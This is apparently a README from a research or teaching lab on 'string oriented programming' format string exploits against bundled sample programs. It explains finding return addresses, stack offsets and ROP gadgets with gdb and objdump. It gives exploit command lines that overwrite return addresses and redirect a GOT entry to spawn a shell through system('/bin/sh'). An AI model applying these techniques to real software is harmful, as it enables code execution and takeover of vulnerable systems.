@@ -1,0 +1,121 @@
+This directory contains some sample programs that can be used to test format
+string exploits.
+
+We supply a tool called sop.py that can be used to generate format strings with
+arbitrary writes.
+The generator supports multiple modes:
+  Generating a string that writes some random memory location:
+   sop.py -r raw -w address -v value -s stack_offset
+
+Options:
+  -w address: address that is written.
+  -v value: value that is written to address.
+     (tuples of w/v can be repeated)
+  -s stack_offset: the format string's stack offset on the stack (in words)
+  -r raw word printed before string
+
+
+String oriented programming exploits the fact that some parts of the application
+are fixed even if ASLR is enabled (e.g., got, plt, code of the main app).
+
+To exploit the sample programs we need some information (that may depend on the
+compiler). The format string constructor needs to know the code locations in the
+fixed part of the application.
+
+Information that we need to know: rip in main, rip in foo, rip in printf,
+location of the user-controlled buffer relative to the printf stack, location of
+the lift_gadget.
+
+Finding RIP (return instruction pointers):
+Start the program in gdb: gdb --args ./test foo
+Use "disas foo", "break foo" to get the correct breakpoins (in the function
+itself that you want to check). Use "info frame" to get the RIP/EIP info. RIPs
+can be used as long as no ASLR is active.
+
+Finding the user-controlled buffer relative to the printf stack:
+Use a string similar to 
+"AAAABBBBCCCC 1:%x 2:%x 3:%x 4:%x 5:%x 6:%x 7:%x 8:%x 9:%x a:%x b:%x c:%x d:%x e:%x f:%x"
+to find the location of the buffer on the stack. If you find
+something like a: 41414141 then you know that the buffer is a=10 words up on
+the stack.
+
+Finding the location of the lift gadget:
+Use "objdump -d ./foo | less" to check the assembly and find the location of the
+lift gadget:
+---
+ 80485f2:       83 c4 1c                add    $0x1c,%esp
+ 80485f5:       5b                      pop    %ebx
+ 80485f6:       5e                      pop    %esi
+ 80485f7:       5f                      pop    %edi
+ 80485f8:       5d                      pop    %ebp
+ 80485f9:       c3                      ret    
+---
+So we use 80485f2 as our lift_gadget address.
+
+
+Simple format string exploit, overwriting RIP of foo or main
+============================================================
+
+File: 01-format_string-stack-EIP
+
+Information that we checked:
+RIP in main: 0xffffd11c
+RIP in foo: 0xffffd0dc
+RIP in printf: 0xffffceac
+String is 4 words up on the stack.
+Function that we want to call is at 0x5655623c
+
+Start programs in gdb to disable ASLR:
+gdb --args ./01-format_string-stack-EIP `./sop.py -w 0xffffcf5c -v 0x0804858e -s 6`
+gdb --args ./01-format_string-stack-EIP `./sop.py -w 0xffffcf2c -v 0x0804858e -s 6`
+gdb --args ./01-format_string-stack-EIP `./sop.py -w 0xffffcb1c -v 0x0804858e -s 6`
+setarch x86_64 -R ./01-format_string-stack-EIP `./sop.py -w 0xffffcf0c -v 0x0804858e -s 6`
+
+
+Format string exploit, overwr. RIP of foo or main, circumvent stack protection
+==============================================================================
+
+File: 02-format_string-stack-EIP-stack_protect
+
+Information that we checked:
+RIP in main: 0xffffcf2c
+RIP in foo: 0xffffcf0c
+RIP in printf: ?
+String is 9 words up on the stack.
+Function that we want to call is at 0x08048606
+
+gdb --args ./02-format_string-stack-EIP-stack_protect `./sop.py -w 0xffffcf0c -v 0x08048606 -s 9`
+
+
+Format string exploit, ASLR, DEP, ProPolice
+===========================================
+
+File: 03-format_string-2ROP
+
+Information that we checked:
+String is 12 words up on the stack.
+Our lift_frame gadget is at 0x08048689
+Address were we can write 8 bytes of data in GOT is: 0x0804a010
+(use objdump to find GOT / PLT locations and check control flow)
+Data we want to place at 0x0804a010 is "/bin/sh" aka 0x6e69622f 0x0068732f
+Two writes will suffice to write: *0x0804a010=0x6e69622f, *0x0804a014=0x0068732f
+Location of puts slot in GOT: 0x804a018
+Location of system@plt: 0x080483f0
+
+So the idea is to use 3 writes:
+2 writes to place our "/bin/sh" at a fixed location
+1 write to redirect a GOT slot of a function that is used right after the printf
+returns. The GOT slot is redirected to call our lift_frame gadget. As soon as
+the function is called we lift the stack and start our ROP gadgets at the
+beginning of the format string.
+
+The beginning of the format string contains some bogus data plus a stack
+invocation frame that calls system with a pointer to our data location ("/bin/sh").
+
+./03-format_string-2ROP `./sop.py -r 0x41414141 -r 0x41414141 -r 0x41414141 -r 0x41414141 -r 0xc0f3bab3 -r 0x080483f0 -r 0x0804a010 -s 12 -w 0x804a010 -v 0x6e69622f -w 0x804a014 -v 0x0068732f -w 0x804a018 -v 0x08048689`
+
+In the end the format string looks like:
+0xc0f3bab3
+0x080483e4
+0x0804a010
+3 writes to prepare control transfer to ROP
